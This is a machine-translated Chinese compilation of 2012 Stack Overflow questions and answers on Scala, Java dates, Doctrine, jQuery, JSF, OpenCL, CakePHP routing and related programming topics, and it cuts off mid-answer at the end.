编辑：性能方面，与案例类匹配将在字节码中使用 instanceof，而对于枚举，scala 编译器生成的代码是我尝试过的任何反编译器都无法处理的。它似乎正在使用`equals`. 因此，从技术上讲，枚举可能会更快，但实际上在性能上不会有任何差异。

# mobli - 按地理坐标获取照片

> ID：13343520
> 
> 赞同：1
> 
> 时间：2012-11-12T12:12:52.693
> 
> 标签：mobli

我正在为我的应用程序使用 Mobli api，并查找 EndPoint 以根据地理坐标获取所有公共照片（这是我要使用的唯一参数。不是搜索查询或任何其他参数）。

任何想法？

# facebook - 为什么 Facebook 喜欢在我的 URL 中被阻止？我不是垃圾邮件发送者

> ID：13343523
> 
> 赞同：-2
> 
> 时间：2012-11-12T12:13:06.167
> 
> 标签：facebook, url, facebook-like, blocked

早上好！

自上周以来，我的网站 URL - www.musiconline.xpg.com.br - 以及来自 www.xpg.com.br 的其他网站，都被 LIKE BUTTON 屏蔽了。

我急需解决这个问题，因为我不是垃圾邮件发送者！！！

我的粉丝页面也有问题：http: [//www.facebook.com/musicasonline](http://www.facebook.com/musicasonline)

我正在尝试在论坛和支持中与 Facebook 交谈，但直到现在我仍然没有答案。

非常感谢大家！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-16T21:54:46.093

我终于找回了我的网址。Facebook 多年来一直阻止使用我们的 URL，是的，很多年。出于某种原因，没有人会在任何帖子中甚至在我们自己的 FB 页面上包含我们的网站 URL (a-fib.com)。他们会收到一条错误消息，说我们的网站已被标记为垃圾邮件。这种情况已经持续了很多年！FB 的客户服务为零。

这是有效的。在三年的时间里尝试了所有其他方法之后，我们终于在我们的信笺上写了一封恳求信，问为什么有人会阻止非营利组织试图帮助心脏病患者？我们将其“挂号信”发送到 FB 总部。（我在网上从有类似问题的人那里找到了其他建议。）它奏效了。赞美主！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:28:41.063

Facebook 不在乎你个人是否是垃圾邮件发送者——它只是阻止整个域，在这种情况下很可能是 xpg.com.br。

这是您在使用共享域时总是要承担的风险。为避免这种情况，最好的方法是获得自己的域——然后只有你自己负责——而现在，如果该域中的一个用户不行为，同一域的所有其他用户也将受到惩罚.

# java - 设置和获取小时、分钟、秒的正确方法

> ID：13343524
> 
> 赞同：8
> 
> 时间：2012-11-12T12:13:07.963
> 
> 标签：java, date, time, calendar

我试图从数据库中获取一些信息，然后使用这些信息来获取一些统计信息。

我想根据几个小时的间隔获取统计信息，因此我创建了一个`HashSet`由两个`Integer`小时和数据组成的。

为了获得正确的时间，我需要从数据库中获取时间。因此我需要创建某种数据/日历对象。

现在由于`Date`已被弃用，我需要找到一种新的方法来设置时间。

有谁知道我怎么能做到这一点？

到目前为止，此解决方案有效：

```
Calendar time = Calendar.getInstance();
        time.setTime(new Date(2012, 11, 12, 8, 10));    
        int hour = time.get(Calendar.HOUR);
        System.out.println(hour); 
```

但如上所述日期已被弃用，所以我想学习“正确”的方法。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-12T12:16:21.603

使用`java.util.Calendar`

```
Calendar c = Calendar.getInstance();
c.set(Calendar.DATE, 2);
c.set(Calendar.HOUR_OF_DAY, 1);
c.set(Calendar.MINUTE, 0);
c.set(Calendar.SECOND, 0);
c.set(Calendar.MILLISECOND, 0); 
```

或者使用 Joda Time [http://joda-time.sourceforge.net/](http://joda-time.sourceforge.net/)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-20T05:54:52.423

# 从数据库中获取日期时间

从数据库获取日期时间已在数百个答案中得到解决。请搜索 StackOverflow。专注于[`java.sql.Timestamp`](http://docs.oracle.com/javase/8/docs/api/java/sql/Timestamp.html)。

要解决问题标题的主题，请继续阅读。

# 乔达时间

如果您使用[Joda-Time](http://www.joda.org/joda-time/)或与 Java 8 捆绑在一起的 java.time 包（受 Joda-Time 的启发），则容易得多。与 Java 捆绑在一起的 java.util.Date 和 .Calendar 类是出了名的麻烦、混乱和缺陷。

时区至关重要。与 java.util.Date 不同，Joda-Time 和 java.time 都为其日期时间对象分配时区。

下面是一些示例代码，展示了在 Joda-Time 2.5 DateTime 对象上设置时间的多种方法。

```
DateTimeZone zoneMontreal = DateTimeZone.forID( "America/Montreal" );  // Specify a time zone, or else the JVM's current default time zone will be assigned to your new DateTime objects.
DateTime nowMontreal = DateTime.now( zoneMontreal );  // Current moment.
DateTime startOfDayMontreal = nowMontreal.withTimeAtStartOfDay();  // Set time portion to first moment of the day. Usually that means 00:00:00.000 but not always.
DateTime fourHoursAfterStartOfDayMontreal = startOfDayMontreal.plusHours( 4 ); // You can add or subtract hours, minutes, and so on.
DateTime todayAtThreeInAfternoon = nowMontreal.withTime(15, 0, 0, 0);  // Set a specific time of day. 
```

## 转换

如果您绝对需要 java.util.Date 对象，请从 Joda-Time 转换。

```
java.util.Date date = startOfDayMontreal.toDate(); 
```

要从 juDate 到 Joda-Time，请将 Date 对象传递给 Joda-Time DateTime 的构造函数。

# javascript - 动态调色板 - Jquery？

> ID：13343525
> 
> 赞同：1
> 
> 时间：2012-11-12T12:13:17.760
> 
> 标签：javascript, jquery, html, css

有人对创建动态调色板有什么建议吗？

我们正在创建一个包含各种客户区域的网站——简而言之，是让客户能够通过设置菜单和选择专色来个性化这些区域的外观和感觉——我们不希望他们能够选择所有专色，因为它很容易看起来很糟糕 - 所以我们希望允许一种专色选择，并有一个 Jquery 算法或类似的东西，可以为所需的其他颜色创建互补色调色板。

这可能吗？有没有人见过这样的事情，或者你能把我推向正确的方向吗？

干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T23:13:15.887

[http://lesscss.org/](http://lesscss.org/)

或者

[http://sass-lang.com/](http://sass-lang.com/)

两者都是出色的动态样式表语言。此外，您还需要一个用于本地开发的编译器。我更喜欢使用[http://incident57.com/codekit/](http://incident57.com/codekit/)

# jquery - 添加数字范围以选择选项

> ID：13343526
> 
> 赞同：0
> 
> 时间：2012-11-12T12:13:19.883
> 
> 标签：jquery, select

我有一个`select`看起来像这样的东西：

```
<select id="address">
  <option noodd="1-9" noeven="2-6">Address Name 1</option>
  <option noodd="3-5" noeven="2-10">Address Name 2</option>
  <option noodd="3-11" noeven="1-5">Address Name 3</option>
</select>

<select id="housenumber">
</select> 
```

Whenever one of the options in `#address`is selected, I need `#housenumber`to be filled with the numbers within the ranges of the address selected. 所以当`Address Name 1`被选中时，我需要`#housenumber`看起来像这样：

```
<select id="housenumber">
  <option>1</option>
  <option>2</option>
  <option>3</option>
  <option>4</option>
  <option>5</option>
  <option>6</option>
  <option>7</option>
  <option>9</option>
</select> 
```

有谁知道如何做到这一点？

**更新**，我需要的是：

*   `noeven`一个函数，用于查找每个中指定的数字之间的所有相等数字`option`。
*   `noodd`查找每个中指定的数字之间的所有奇数的函数`option`。
*   组合这两个列表并将它们放入`option`元素的函数
*   A function that appends these `option`elements to `#housenumber`whenever the corresponding `option`in `#address`is selected

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:43:27.460

这样的事情应该这样做：

```
$('#address').change(function(){
    var $selected = $('option:selected',this);
    var odd = $selected.attr('noodd').split('-');
    var even = $selected.attr('noeven').split('-');

    var arr = [];
    for(var o = parseInt(odd[0],10);o<=parseInt(odd[1],10);o+=2){
       arr.push(o);  
    }

    for(var e = parseInt(even[0],10);e<=parseInt(even[1],10);e+=2){
       arr.push(e);  
    }

    var $housenumber = $('#housenumber');
    $housenumber.empty();
    $.each(arr.sort(function(a,b){return a-b;}),function(i,e){
       $housenumber.append($('<option/>').text(e));
    });
}); 
```

现场示例：http: [//jsfiddle.net/uhwMS/](http://jsfiddle.net/uhwMS/)

几点注意事项：

1.  您应该使用`data-*`属性而不是自定义属性。使您的选项节点看起来像`<option data-odd="1-9" data-even="2-6">Address Name 1</option>`使阅读它们更安全，例如`var odd = $selected.data('odd').split('-');`

2.  你的第三个元素有奇数偶数，给出一些奇怪的结果。假设这只是发布问题的错误？

# scala - 如何从scala中的for循环中产生单个元素？

> ID：13343531
> 
> 赞同：20
> 
> 时间：2012-11-12T12:13:40.580
> 
> 标签：scala

很像这个问题：

[提前退出循环的功能代码](https://stackoverflow.com/questions/6729785/functional-code-for-looping-with-early-exit)

说代码是

```
def findFirst[T](objects: List[T]):T = {
  for (obj <- objects) {
    if (expensiveFunc(obj) != null) return /*???*/ Some(obj)
  }
  None
} 
```

如何在scala中从这样的for循环中产生单个元素？

我不想使用 find，正如原始问题中提出的那样，我很好奇是否以及如何使用 for 循环来实现它。

*** 更新 ***

首先，感谢所有评论，但我想我的问题并不清楚。我正在拍摄这样的东西：

```
val seven = for {
    x <- 1 to 10
    if x == 7
} return x 
```

这不会编译。这两个错误是： - 在方法定义之外返回 - 方法 main 有返回语句；需要结果类型

我知道 find() 在这种情况下会更好，我只是在学习和探索语言。在具有多个迭代器的更复杂的情况下，我认为使用 for 查找实际上是有用的。

感谢评论者，我会开始赏金来弥补这个问题的糟糕姿势:)

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-11-12T12:49:13.227

如果你想使用一个循环，它使用比,等`for`的链式调用更好的语法，有一个巧妙的技巧。与其迭代像列表这样的严格集合，不如迭代像迭代器或流这样的惰性集合。如果你从一个严格的集合开始，让它变得懒惰，例如.`.find``.filter``.toIterator`

让我们看一个例子。

首先让我们定义一个“嘈杂”的 int，它会在它被调用时显示给我们

```
def noisyInt(i : Int) = () => { println("Getting %d!".format(i)); i } 
```

现在让我们用其中的一些来填写一个列表：

```
val l = List(1, 2, 3, 4).map(noisyInt) 
```

我们要寻找第一个偶数元素。

```
val r1 = for(e <- l; val v = e() ; if v % 2 == 0) yield v 
```

上面的行导致：

```
Getting 1!
Getting 2!
Getting 3!
Getting 4!
r1: List[Int] = List(2, 4) 
```

...意味着访问了所有元素。这是有道理的，因为结果列表包含*所有*偶数。这次让我们迭代一个迭代器：

```
val r2 = (for(e <- l.toIterator; val v = e() ; if v % 2 == 0) yield v) 
```

这导致：

```
Getting 1!
Getting 2!
r2: Iterator[Int] = non-empty iterator 
```

请注意，循环只执行到它可以确定结果是空迭代器还是非空迭代器。

要获得第一个结果，您现在只需调用`r2.next`.

如果你想要一个`Option`类型的结果，使用：

```
if(r2.hasNext) Some(r2.next) else None 
```

* * *

**编辑**您在此编码中的第二个示例只是：

```
val seven = (for {
    x <- (1 to 10).toIterator
    if x == 7
} yield x).next 
```

...当然，如果您要使用`.next`. 或者，使用`headOption`为所有`Traversable`s 定义的 来获得`Option[Int]`.

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-11-16T15:19:30.597

您可以将列表转换为流，以便 for 循环包含的任何过滤器仅按需评估。但是，从流中产生将始终返回一个流，而您想要的是我想一个选项，因此，作为最后一步，您可以检查生成的流是否具有至少一个元素，并将其头部作为选项返回。headOption 函数正是这样做的。

```
def findFirst[T](objects: List[T], expensiveFunc: T => Boolean): Option[T] =
    (for (obj <- objects.toStream if expensiveFunc(obj)) yield obj).headOption 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-12T12:32:48.583

为什么不完全按照您上面的草图进行操作，即`return`从循环早期开始？如果您对 Scala 在后台实际执行的操作感兴趣，请使用`-print`. Scala将循环脱糖成a `foreach`，然后使用异常提前离开`foreach`。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-12T12:32:33.080

所以你要做的是在你的条件得到满足后打破一个循环。这里的答案可能是您正在寻找的。[如何在 Scala 中跳出循环？](https://stackoverflow.com/questions/2742719/how-do-i-break-out-of-a-loop-in-scala).

总的来说，Scala 中的 for comprehension 被翻译为 map、flatmap 和 filter 操作。因此，除非您抛出异常，否则无法突破这些功能。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-12T12:44:49.073

如果您想知道，这就是在[LineerSeqOptimized.scala](https://github.com/scala/scala/blob/master/src/library/scala/collection/LinearSeqOptimized.scala)中实现 find 的方式；List 继承了哪个

```
override /*IterableLike*/
  def find(p: A => Boolean): Option[A] = {
    var these = this
    while (!these.isEmpty) {
      if (p(these.head)) return Some(these.head)
      these = these.tail
    }
    None
  } 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-12T12:54:54.370

这是一个可怕的黑客。但它会让你得到你想要的结果。

习惯上你会使用 Stream 或 View 并且只计算你需要的部分。

```
def findFirst[T](objects: List[T]): T = {

def expensiveFunc(o : T)  = // unclear what should be returned here

case class MissusedException(val data: T) extends Exception

try {
  (for (obj <- objects) {
    if (expensiveFunc(obj) != null) throw new MissusedException(obj)
  })
  objects.head // T must be returned from loop, dummy
} catch {
  case MissusedException(obj) => obj
} 
```

}

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-11-19T13:16:38.617

为什么不喜欢

```
object Main {     
  def main(args: Array[String]): Unit = {
    val seven = (for (
    x <- 1 to 10
    if x == 7
    ) yield x).headOption
  }
} 
```

如果值满足条件，变量`seven`将是持有的期权`Some(value)`

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-11-12T16:19:29.470

我希望能帮助你。

我认为......没有“回报”的暗示。

```
object TakeWhileLoop extends App {
    println("first non-null: " + func(Seq(null, null, "x", "y", "z")))

    def func[T](seq: Seq[T]): T = if (seq.isEmpty) null.asInstanceOf[T] else
        seq(seq.takeWhile(_ == null).size)
}

object OptionLoop extends App {
    println("first non-null: " + func(Seq(null, null, "x", "y", "z")))

    def func[T](seq: Seq[T], index: Int = 0): T = if (seq.isEmpty) null.asInstanceOf[T] else
        Option(seq(index)) getOrElse func(seq, index + 1)
}

object WhileLoop extends App {
    println("first non-null: " + func(Seq(null, null, "x", "y", "z")))

    def func[T](seq: Seq[T]): T = if (seq.isEmpty) null.asInstanceOf[T] else {
        var i = 0
        def obj = seq(i)
        while (obj == null)
            i += 1
        obj
    }
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-11-15T16:30:44.357

```
objects iterator filter { obj => (expensiveFunc(obj) != null } next 
```

诀窍是在集合上获得一些惰性评估视图，可以是迭代器或流，或 objects.view。过滤器只会在需要时执行。

# php - 在多对多关系中使用 EntityRepository::findBy() 将导致 Doctrine 中的 E_NOTICE

> ID：13343533
> 
> 赞同：35
> 
> 时间：2012-11-12T12:13:46.560
> 
> 标签：php, symfony, doctrine, many-to-many, database-relations

对于 Symfony2 项目，我必须在博客文章和所谓的平台之间建立关系。平台根据您用于查看站点的域定义特定的过滤器。例如：如果您通过 url first-example.com 加入该站点，该站点将仅提供连接到该特定平台的博客文章。

为此，我创建了两个实体 Post 和 Platform。之后，我将它们与多对多关系映射在一起。我试图通过这种多对多关系从`findBy()`Doctrines 的内置函数中检索数据`EntityRepository`。

```
// every one of these methods will throw the same error
$posts = $postRepo->findBy(array('platforms' => array($platform)));
$posts = $postRepo->findByPlatforms($platform);
$posts = $postRepo->findByPlatforms(array($platform)); 
```

实体和现有对象`$postRepo`的正确存储库在哪里。 无论哪种方式：我最终收到以下错误：`Post``$platform``Platform`

```
ErrorException: Notice: Undefined index: joinColumns in [...]/vendor/doctrine/orm/lib/Doctrine/ORM/Persisters/BasicEntityPersister.php line 1495

[...]/vendor/doctrine/orm/lib/Doctrine/ORM/Persisters/BasicEntityPersister.php:1495
[...]/vendor/doctrine/orm/lib/Doctrine/ORM/Persisters/BasicEntityPersister.php:1452
[...]/vendor/doctrine/orm/lib/Doctrine/ORM/Persisters/BasicEntityPersister.php:1525
[...]/vendor/doctrine/orm/lib/Doctrine/ORM/Persisters/BasicEntityPersister.php:1018
[...]/vendor/doctrine/orm/lib/Doctrine/ORM/Persisters/BasicEntityPersister.php:842
[...]/vendor/doctrine/orm/lib/Doctrine/ORM/EntityRepository.php:157
[...]/src/Foobar/BlogBundle/Tests/ORM/PostTest.php:102 
```

甚至有可能以这种方式检索多对多关系中的相关实体，还是我被迫自己编写这些函数？奇怪的是：Doctrine 不会抛出任何错误，例如：“不可能。”，而是一个内部的`E_NOTICE`. 这就是为什么我倾向于认为它应该是可能的，但我在这里遗漏了一些观点。

剥离到有趣的部分，这两个实体看起来像这样。

```
<?php

namespace Foobar\CommunityBundle\Entity;

use Doctrine\Common\Collections\ArrayCollection;
use Doctrine\ORM\Mapping as ORM;

// [...] other namespace stuff

/**
 * @ORM\Entity(repositoryClass="Foobar\CommunityBundle\Entity\Repository\PlatformRepository")
 * @ORM\Table(name="platforms")
 */
class Platform
{
    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     */
    protected $id;

    // [...] other field stuff
} 
```

```
<?php

namespace Foobar\BlogBundle\Entity;

use Doctrine\Common\Collections\ArrayCollection;
use Doctrine\ORM\Mapping as ORM;

// [...] other namespace stuff

/**
 * @ORM\Entity(repositoryClass="Foobar\BlogBundle\Entity\Repository\PostRepository")
 * @ORM\Table(name="posts")
 */
class Post implements Likeable, Commentable, Taggable, PlatformAware
{
    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     */
    protected $id;

    /**
     * @ORM\ManyToMany(targetEntity="Foobar\CommunityBundle\Entity\Platform", cascade={"persist"})
     * @ORM\JoinTable(name="map_post_platform",
     *      joinColumns={@ORM\JoinColumn(name="post_id", referencedColumnName="id")},
     *      inverseJoinColumns={@ORM\JoinColumn(name="platform_id", referencedColumnName="id")}
     *      )
     */
    protected $platforms;

    // [...] other fields

    /**
     * Constructor
     */
    public function __construct()
    {
        // [...]
        $this->platforms  = new ArrayCollection();
    }
} 
```

当然还有 composer.json 文件（以及相关行）

```
{
    [...]
    "require": {
        "php": ">=5.3.3",
        "symfony/symfony": "2.1.*",
        "doctrine/orm": ">=2.2.3,<2.4-dev",
        "doctrine/doctrine-bundle": "1.0.*",
        "doctrine/doctrine-fixtures-bundle": "dev-master",
        [...]

    },
    [...]
} 
```

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2014-09-22T13:11:35.550

另一种方式，可能有点 OO/cleaner 而不使用 ID：

```
public function getPosts(Platform $platform)
{
    $qb = $this->createQueryBuilder("p")
        ->where(':platform MEMBER OF p.platforms')
        ->setParameters(array('platform' => $platform))
    ;
    return $qb->getQuery()->getResult();
} 
```

更好的方法名称是`findPostsByPlatform`

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2012-11-22T16:40:58.630

这是很有可能的，但是 Stock Doctrine Repository 不是这样工作的。

您有两种选择，具体取决于您的上下文：

在存储库中编写自定义方法。

```
class PostRepository extends EntityRepository
{
  public function getPosts($id)
  {
    $qb = $this->createQueryBuilder('p');
    $qb->join('p.platform', 'f')
       ->where($qb->expr()->eq('f.id', $id));
    return $qb;
  }
} 
```

或者使用平台对象中的默认 getter 方法。

```
$posts = $platform->getPosts(); 
```

你“精简到有趣的部分”，所以如果你有这个方法并不明显，但它通常是在

```
app/console doctrine:generate:entities 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-08-17T14:51:28.203

这个问题似乎是您想要双向（现在是单向）的多对多关系的问题。使用 MappedBy 创建双向性：

[http://doctrine-orm.readthedocs.org/en/latest/reference/association-mapping.html#many-to-many-bidirectional](http://doctrine-orm.readthedocs.org/en/latest/reference/association-mapping.html#many-to-many-bidirectional)

实际的 ：

您的一个实体是 OWNING SIDE，另一个是 INVERSE SIDE。在您的示例中，名为 Post 的实体是拥有方，而名为 Platform 的实体是反方。

拥有方设置：

```
Class Post {
    ...     
    /**
    * @ManyToMany(targetEntity="Platform")
    * @JoinTable(name="map_post_platform",
    *      joinColumns={@JoinColumn(name="post_id", referencedColumnName="id")},
    *      inverseJoinColumns={@JoinColumn(name="platform_id", referencedColumnName="id", unique=true)} )
    **/
    protected $platforms;
    ...
    public function Post() {
        $this->platforms= new ArrayCollection();
    }
    ...
    public function assignToPlatform($platform) {
        $this->platforms[] = $platform;
    } 
    ...
    public function getPlatforms() {
        return $this->platforms;
    }
} 
```

反面设置：

```
Class Platform {
    ...
    /**
    * @ManyToMany(targetEntity="Post", mappedBy="platforms")
    **/
    protected $posts;
    ...
    public function Platform() {
        $this->posts= new ArrayCollection();
    }
    ...
    public function getPosts()
    {
        return $this->posts;
    }
} 
```

示例检索一组实体，从一侧开始：

```
$post->getPlatforms();
$platform->getPosts(); 
```

# c# - Page out of frame load 事件运行多次

> ID：13343537
> 
> 赞同：0
> 
> 时间：2012-11-12T12:13:59.507
> 
> 标签：c#, javascript, asp.net, iframe

我的第一页上有一个 iframe，并且正在将框架重定向到第二页上的第二页我正在使用 javascript 跳出 iframe，如下所示：

```
<script language="JavaScript" type="text/javascript">
<!--
    function breakout_of_frame() {
        if (top.location != location) {
            top.location.href = document.location.href;
        }
    }
-->
</script> 
```

我的问题是这将使页面运行多次，并且我在加载事件中的代码将执行（例如，如果我在加载时发送电子邮件将发送三次）。

现在我尝试使用布尔值来查看何时发送电子邮件，将其设置为 true，如果为 false，则不发送......但它仍然无法正常工作。有什么建议可以防止这种情况发生吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:19:46.460

一个简单、粗略和现成的解决方案：

在您的以下请求中，将一些内容附加到您的请求的查询字符串中，以识别两个页面之间的差异。

当您阅读 document.location.href 时，将其解析为不同的元素并做出相应的反应。

例如：

你的域/你的路径/你的文件？donealready=yes

```
 alert(document.location.href) //will have the parameter at the end
   //parse this to determine how to react 
```

# c# - 使用 MVC 插入多对多记录

> ID：13343538
> 
> 赞同：0
> 
> 时间：2012-11-12T12:14:00.037
> 
> 标签：c#, asp.net-mvc, entity-framework, asp.net-mvc-4, many-to-many

我有两个以多对多关系链接的表。当我尝试插入新的链接对象时，MVC 实体框架会隐藏链接表并忽略它。

表在 personID 和 interventionID 上链接，并带有这两者的组合 PK。

我正在添加一个新的干预措施，该干预措施将 interventioID 创建为新密钥。我已将 personID 传递给控制器​​，调试器将其显示为正确的值。

但是，当我打电话时：

```
 db.tInterventions.Add(tintervention);
        db.SaveChanges();
        return RedirectToAction("Index"); 
```

...链接表没有被填满。

创建方法如下：

```
 [HttpPost]
 public ActionResult Create([Bind(Exclude = "interventionID")]tIntervention tintervention,
 tPerson tperson,
 int id,
 int? personID) 
```

如何强制在链接表上插入？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T17:09:27.470

问题归结于 PersonID 在可选参数中。因为该参数不是必需的，所以 ModelState.IsValid 将在填充 PersonID 但未将值传递到模型时返回 True。

我添加了一个条件来检查 personID，然后对干预进行了查找/绑定，如下所示：

```
[HttpPost]
public ActionResult Create([Bind(Exclude = "interventionID")]tIntervention tintervention, int id, int? personid)
{
    tintervention.householdID = id;

    if (ModelState.IsValid)
    {
        db.tInterventions.Add(tintervention);

        if (personid.HasValue)
        {
            int personID = personid.Value;

            var q = (
                        from p in db.tPersons
                        where (p.personID == personID)
                        select p.personID
                        );
            personID = q.FirstOrDefault();
            tPerson tperson = db.tPersons.Find(personID);

            tintervention.tPersons.Add(tperson);
        }

        db.SaveChanges();

        return RedirectToAction("Index");
    }

    return View(tintervention);
} 
```

这可能不是完成此任务的最佳方法，但它确实有效。欢迎任何进一步的评论。

# javascript - Chrome NaCl 和 V8 有关系吗？

> ID：13343539
> 
> 赞同：0
> 
> 时间：2012-11-12T12:14:05.967
> 
> 标签：javascript, google-chrome, v8, google-nativeclient

一个启用另一个，还是一个影响另一个？

似乎 V8 允许原生 C++ 访问 Javascript，而 NaCl 允许您在浏览器中运行原生代码。

抱歉这个天真的问题。我落后于 Javascript 的最新发展，很惊讶现代浏览器实际上是 JIT 编译的！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T03:27:18.977

简短的回答 - 不。

更长的答案，

Chrome 附带 V8 JS 引擎并使用它来执行嵌入在网页中的 JavaScript。Chrome 中的 V8 无法扩展以访问 C++，反之亦然。

NaCl 是一个工具链和运行时环境，允许您将现有的 C++ 代码编译为安全的可执行文件，然后从网页安全地执行它。

通过将 V8 嵌入到您自己的 C++ 应用程序中，可以单独使用 V8，并按照您认为合适的方式对其进行扩展。

HTH，约翰

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T06:03:04.360

[http://research.google.com/pubs/archive/37204.pdf](http://research.google.com/pubs/archive/37204.pdf)

可以在 NaCl 中运行 v8（的修改版本）。JIT 发出的代码序列必须符合沙盒安全规则。

反过来是不可能的。

:-)

-bsy

# jsf - 当我关闭浏览器时 Jsf 应用程序关闭

> ID：13343545
> 
> 赞同：0
> 
> 时间：2012-11-12T12:14:26.957
> 
> 标签：jsf, glassfish-3

我做了一个 jsf 应用程序。这个应用程序有一个包含开始、停止按钮的菜单。当按下开始时，应用程序开始从网站获取数据，并更新它的数据库。应用程序还有更新过程的进度条。但是，这个过程需要很长时间才能完成。我希望当我关闭浏览器时，它应该继续更新数据库。此外，当我再次打开它时，我应该得到以前的状态。但是，这没有发生。当我关闭浏览器时应用程序也关闭了。我该怎么做？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T14:12:36.627

就我而言，我不会延长会话寿命。相反，创建一个任务并将执行任务的对象添加到`@ApplicationScoped`bean 中的队列中，并将启动作业的用户和作业状态保存在数据库（或任何其他地方）中。

当用户注销（手动注销或关闭 Web 浏览器）时，该任务仍将被执行，因为它由整个应用程序管理（而不是由请求或用户会话）。当用户再次登录时，他/她可以向这个应用程序队列询问任务的状态。

您将需要（至少）：

*   `@ApplicationScoped`将包含和处理任务的托管 bean。
*   一种同时处理和执行一个或多个任务的方法。这可以通过一种[`ExecutorService`](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ExecutorService.html)或类似的技术来实现。注意：不要自己手动启动新线程，这只会导致你的web应用服务器被kill掉。
*   将用户与他/她已开始的任务映射的结构。它可以用 a 进行映射，`Map<String, List<Task>>`以便单个用户此时可以拥有多个任务。最好将其保存在数据库（或类似数据库）中，以便为这些不驻留在内存中的任务记录日志。您甚至可以这样设计，以便在取消部署 Web 应用程序或服务器突然关闭时，可以从保存状态点重新启动手头的任务。

# windows - 从 Windows 运行带有标志的可执行文件

> ID：13343546
> 
> 赞同：2
> 
> 时间：2012-11-12T12:14:36.073
> 
> 标签：windows

我有一个可执行文件，比如说“program.exe”

如果我从命令行运行它，我可以给它一些可选标志，输出将根据这些选项。例如“program.exe -m”

是否可以通过单击它并给它一个标志来从 Windows 运行该程序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:19:40.880

您可以创建exe的快捷方式，也可以创建批处理文件，无论哪种方式，您都可以双击它，它将使用您指定的参数运行exe。

# opencl - 内存位置和分配

> ID：13343547
> 
> 赞同：1
> 
> 时间：2012-11-12T12:14:42.267
> 
> 标签：opencl, gpgpu

例如：要对数组执行算法，我们必须使用由数组创建的缓冲区。但是对于 Intel/AMD CPU，它使用系统的 DDR，如全局内存。最后，表被创建了两次。有没有办法在不分配缓冲区的情况下使用内存中的表。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T17:35:54.687

您可以通过在创建缓冲区时设置**CL_MEM_USE_HOST_PTR标志来*****要求***OpenCL 使用原始内存区域。

 **如果内核在 CPU 上运行，则不会发生内存复制。

如果在 GPU 上运行，如果 OpenCL 运行时认为它更合适，则***可能会***出现副本。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T13:45:57.970

CPU 可以访问机器的内存，但不能访问 GPU 的内存。同样，GPU 可以访问自己的内存，但不能访问主机的内存。这就是您必须在它们之间传输信息的原因 - 它们是两个完全独立的内存空间。

与 gpgpu 不同，使用 OpenCL，内核可能在 CPU 本身上运行，因此无需复制缓冲区；但是 OpenCL 仍然总是要求您显式传输内存，只是如果它在主机上运行，​​它的实现将忽略它。**

# c# - 从 USB 打印机获取信息

> ID：13343551
> 
> 赞同：1
> 
> 时间：2012-11-12T12:15:02.917
> 
> 标签：c#, java, vbscript, wmi, snmp

我想通过任何 java 或 .net 应用程序发现本地打印机（通过 USB 连接）。我需要直接从打印机获得以下信息。1\. 打印机品牌和型号 2\. 序列号 3\. 页数

我在 java 中尝试过 SNMP API，但它仅适用于网络打印机。我正在搜索与 USB 打印机通信并为我提供信息的任何 API 或脚本。

到目前为止，我已经尝试过 WMI 查询，但通过这些查询，我无法从 USB 打印机获取页数和序列号值。

对此的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:25:42.817

```
private void Form1_Load (object sender, System.EventArgs e)

{

foreach (String printer in PrinterSettings.InstalledPrinters)

{

printersList.Items.Add (printer.ToString());

}

} 
```

试试上面的代码。它在 c# .net 中有关更多信息，请访问 url： [http ://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/efaf11bf-f7ae-4167-ba0b-d495b0e21946](http://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/efaf11bf-f7ae-4167-ba0b-d495b0e21946)

# cakephp - CakePHP 路由，反向重定向

> ID：13343555
> 
> 赞同：2
> 
> 时间：2012-11-12T12:15:17.423
> 
> 标签：cakephp, cakephp-2.2

假设我有一个控制器`Articles`和一个动作`Search`。

我在*routes.php*中设置了路由器配置，如下所示：

```
Router::connect(
                 '/search/:search_term/*', 
                 array('controller' => 'articles', 'action' => 'search')
); 
```

这样，当我导航到时，我可以在搜索结果中看到包含“ *cakephp ”的文章标题*`http://localhost/search/cakephp`

但是，如果我导航到`http://localhost/articles/search/cakephp`我会看到相同的结果。

我想要的是自动重定向到

```
http://localhost/search/cakephp 
```

当我导航到

```
http://localhost/articles/search/cakephp 
```

基于*routes.php*中的配置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:33:29.050

你必须创建 .htaccess 重定向，因为你不能用路由做到这一点：

```
RewriteRule ^articles/search/(.+)$ /search/$1 [L,NC] 
```

好的，我发现了一些东西，但不太确定它会起作用：

```
Router::redirect(
